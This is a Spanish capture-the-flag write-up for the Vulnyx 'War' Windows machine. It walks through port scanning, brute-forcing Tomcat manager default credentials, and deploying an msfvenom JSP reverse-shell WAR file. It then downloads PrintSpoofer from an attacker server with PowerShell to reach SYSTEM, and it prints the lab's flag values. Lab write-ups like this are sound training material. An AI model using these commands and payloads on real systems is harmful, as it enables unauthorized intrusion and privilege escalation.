---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# War Vulnyx (Easy - Windows)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-03 04:07 EDT
Nmap scan report for 192.168.5.70
Host is up (0.047s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8080/tcp  open  http          Apache Tomcat (language: en)
|_http-title: Apache Tomcat/11.0.1
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27💿DF:7E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: WAR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27💿df:7e (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-08-03T18:09:54
|_  start_date: N/A
|_clock-skew: 9h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 175.87 seconds
```

Veremos varias cosas interesantes, entre ellas un puerto `8080` si entramos dentro del mismo, veremos un `apache Tomcat`, esto es bastante interesante, vamos abrir `metasploit` para probar a realizar una `fuerza bruta` del `login` del `manager` (Administrador) y a ver si podemos encontrar las credenciales para ir al panel de admin.

```shell
msfconsole -q
```

Una vez dentro utilizaremos el siguiente modulo:

```shell
use auxiliary/scanner/http/tomcat_mgr_login
```

Ahora lo configuraremos simplemente de esta forma:

```shell
set RHOSTS <IP_VICTIM>
run
```

Info:

```
[!] No active DB -- Credential data will not be saved!
[-] 192.168.5.70:8080 - LOGIN FAILED: admin:admin (Incorrect)
[-] 192.168.5.70:8080 - LOGIN FAILED: admin:manager (Incorrect)
[-] 192.168.5.70:8080 - LOGIN FAILED: admin:role1 (Incorrect)
[-] 192.168.5.70:8080 - LOGIN FAILED: admin:root (Incorrect)
[+] 192.168.5.70:8080 - Login Successful: admin:tomcat
```

Vemos que encontro unas credenciales por defecto, por lo que vamos a probarlas, nos iremos a la siguiente ruta web.

```
URL = http://<IP>/manager/html
```

Aqui nos pedira un `login` meteremos lo que encontramos `admin:tomcat` y veremos que estaremos dentro del panel de administrador, estando aqui dentro podremos probar a subir un archivo `.war` en el que cuando accedamos nos de una `reverse shell`, vamos a probar a ver si funciona.

## Escalate user nt authority\local service

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP-ATTACKER> LPORT=<PORT> -f war -o shell.war
```

Ahora vamos a ponernos a la escucha antes de nada:

```shell
nc -lvnp <PORT>
```

Una vez echo esto, nos iremos a la pagina y en la parte de `WAR file to deploy` subiremos el archivo `war` que hemos generado, una vez cargado y subido, un poco mas arriba veremos nuestro `war` subido en `Applications` por lo que ha funcionado de forma correcta.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-03 102138.png" alt=""><figcaption></figcaption></figure>

Ahora si le damos a ese `/shell` nos llevara a la "pagina" que hemos creado, una vez dado a dicha "pagina" si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.70] 56192
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Apache Software Foundation\Tomcat 11.0>whoami
whoami
nt authority\local service
```

Veremos que ha funcionado, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Escalate Privileges

Si listamos los permisos que tenemos veremos lo siguiente:

```shell
whoami /priv
```

Info:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeSystemtimePrivilege         Change the system time                    Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

Veremos bastante interesante esta linea:

```
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

Al saber que tenemos como victima un `Windows 10` posiblemente no funcione el ejecutable antiguo llamado `JuicyPotato.exe` ya que Algunas versiones modernas de Windows **bloquean DCOM/COM CLSIDs**, por lo que vamos a utilizar una version mas facil llamada `PrintSpoofer`.

URL = [PrintSpoofer64.exe GitHub](https://github.com/itm4n/PrintSpoofer/releases)

Una vez que nos hayamos descargado el de `64 bits` vamos a pasarnoslo a nuestra maquian victima de esta forma con un comando de `powershell`.

Antes abriremos un servidor de `python3` donde este el binario.

```shell
python3 -m http.server 8000
```

Ahora ejecutamos esto en la maquina victima:

```powershell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>:8000/PrintSpoofer64.exe', 'C:\Users\Public\Downloads\PrintSpoofer64.exe')"
```

Una vez echo lo anterior lo vamos a ejecutar de esta forma:

```powershell
.\PrintSpoofer64.exe -i -c powershell
```

Info:

```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

Con esto veremos que ha funcionado y seremos ya directamente `nt authority\system` por lo que vamos a leer las `flags` del usuario y de `root`.

> user.txt

```
3a1ddb915bd423f0ca428dce35612dcb
```

> root.txt

```
1399d5ba705df14146335def4ff64520
```
